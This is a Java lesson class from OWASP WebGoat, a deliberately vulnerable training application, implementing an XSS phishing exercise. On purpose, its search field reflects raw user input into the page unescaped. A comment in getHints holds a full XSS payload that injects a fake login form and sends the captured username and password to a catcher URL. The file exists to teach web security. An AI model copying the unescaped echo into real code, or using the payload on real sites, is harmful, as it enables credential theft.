
package org.owasp.webgoat.plugin;

import java.util.ArrayList;
import java.util.List;
import org.apache.ecs.Element;
import org.apache.ecs.ElementContainer;
import org.apache.ecs.StringElement;
import org.apache.ecs.html.B;
import org.apache.ecs.html.BR;
import org.apache.ecs.html.Comment;
import org.apache.ecs.html.H1;
import org.apache.ecs.html.HR;
import org.apache.ecs.html.Input;
import org.apache.ecs.html.TD;
import org.apache.ecs.html.TH;
import org.apache.ecs.html.TR;
import org.apache.ecs.html.Table;
import org.owasp.webgoat.Catcher;
import org.owasp.webgoat.lessons.Category;
import org.owasp.webgoat.lessons.LessonAdapter;
import org.owasp.webgoat.session.ECSFactory;
import org.owasp.webgoat.session.WebSession;


/***************************************************************************************************
 * 
 * 
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * 
 * Copyright (c) 2002 - 20014 Bruce Mayhew
 * 
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * 
 * Getting Source ==============
 * 
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
 * projects.
 * 
 * For details, please see http://webgoat.github.io
 * 
 * @author Bruce Mayhew <a href="http://code.google.com/p/webgoat">WebGoat</a>
 * @created March 13, 2007
 */
public class Phishing extends LessonAdapter
{

    /**
     * Description of the Field
     */
    protected final static String SEARCH = "Username";
    private String searchText;

    /**
     * Description of the Method
     * 
     * @param s
     *            Description of the Parameter
     * @return Description of the Return Value
     */
    private boolean postedCredentials(WebSession s)
    {
        String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
                                                                                                Catcher.EMPTY_STRING);

        // <START_OMIT_SOURCE>
        return (!postedToCookieCatcher.equals(Catcher.EMPTY_STRING));
        // <END_OMIT_SOURCE>
    }

    /**
     * Description of the Method
     * 
     * @param s
     *            Description of the Parameter
     * @return Description of the Return Value
     */
    protected Element createContent(WebSession s)
    {
        ElementContainer ec = new ElementContainer();

        try
        {
            searchText = s.getParser().getRawParameter(SEARCH, "");
            // <START_OMIT_SOURCE>
            // <END_OMIT_SOURCE>

            ec.addElement(makeSearch(s));
            if (postedCredentials(s))
            {
                makeSuccess(s);
            }
        } catch (Exception e)
        {
            s.setMessage(getLabelManager().get("PhishingErrorGenerating") + this.getClass().getName());
        }

        return (ec);
    }

    protected Element makeSearch(WebSession s)
    {
        ElementContainer ec = new ElementContainer();

        ec.addElement(new H1().addElement(getLabelManager().get("PhishingDialogTitle")));
        Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign("center");

        TR tr = new TR();
        tr.addElement(new TD().addElement("&nbsp;").setColSpan(2));
        t.addElement(tr);
        if (s.isColor())
        {
            t.setBorder(1);
        }

        tr = new TR();
        tr.addElement(new TH().addElement(getLabelManager().get("PhishingDialogText")).setColSpan(2)
                .setAlign("center"));
        t.addElement(tr);

        tr = new TR();
        tr.addElement(new TD().addElement("&nbsp;").setColSpan(2));
        t.addElement(tr);

        TR row1 = new TR();
        row1.addElement(new TD(new B(new StringElement(getLabelManager().get("PhishingSearch1")))).setAlign("right"));

        Input input1 = new Input(Input.TEXT, SEARCH, searchText);
        row1.addElement(new TD(input1).setAlign("left"));
        t.addElement(row1);

        Element b = ECSFactory.makeButton(getLabelManager().get("PhishingSearch2"));
        t.addElement(new TR(new TD(b).setColSpan(2)).setAlign("center"));
        ec.addElement(t);

        if (!searchText.equals(""))
        {
            ec.addElement(new BR());
            ec.addElement(new HR());
            ec.addElement(new BR());
            ec.addElement(new StringElement(getLabelManager().get("PhishingResults") + searchText));
            ec.addElement(new Comment(getLabelManager().get("PhishingSearchResults")));
            ec.addElement(new BR());
            ec.addElement(new BR());
            ec.addElement(new B(new StringElement(getLabelManager().get("PhishingNoResults"))));
            ec.addElement(new Comment(getLabelManager().get("PhishingEndOfSearchResults")));
        }

        return (ec);
    }

    /**
     * Gets the hints attribute of the CluesScreen object
     * 
     * @return The hints value
     */
    protected List<String> getHints(WebSession s)
    {
        List<String> hints = new ArrayList<String>();
        hints.add(getLabelManager().get("PhishingHint1"));
        hints.add(getLabelManager().get("PhishingHint2"));
        hints.add(getLabelManager().get("PhishingHint3"));
        hints.add(getLabelManager().get("PhishingHint4"));
        hints.add(getLabelManager().get("PhishingHint5"));
        hints.add(getLabelManager().get("PhishingHint6"));
        hints.add(getLabelManager().get("PhishingHint7"));
        /**
         * password<script>function hack(){ alert("Had this been a real attack... Your credentials
         * were just stolen.\nUser Name = " + document.phish.user.value + "\nPassword = " +
         * document.phish.pass.value); XSSImage=new Image;
         * XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user="
         * +document.phish.user.value + "&password=" + document.phish.pass.value +
         * "";}</script><form name="phish"><br>
         * <br>
         * <HR>
         * <H3>This feature requires account login:</H2> <br>
         * <br>
         * Enter Username:<br>
         * <input type="text" name="user"><br>
         * Enter Password:<br>
         * <input type="password" name = "pass"><br>
         * <input type="submit" name="login" value="login" onclick="hack()"></form><br>
         * <br>
         * <HR>
         * <!--
         * 
         */
        return hints;
    }

    /**
     * Gets the instructions attribute of the XssSearch object
     * 
     * @return The instructions value
     */
    public String getInstructions(WebSession s)
    {
        String instructions = getLabelManager().get("PhishingInstructions");
        return (instructions);
    }

    private final static Integer DEFAULT_RANKING = new Integer(30);

    protected Integer getDefaultRanking()
    {
        return DEFAULT_RANKING;
    }

    /**
     * Gets the category attribute of the FailOpenAuthentication object
     * 
     * @return The category value
     */
    protected Category getDefaultCategory()
    {
        return Category.XSS;
    }

    /**
     * Gets the title attribute of the CluesScreen object
     * 
     * @return The title value
     */
    public String getTitle()
    {
        return (getLabelManager().get("PhishingTitle"));
    }

}
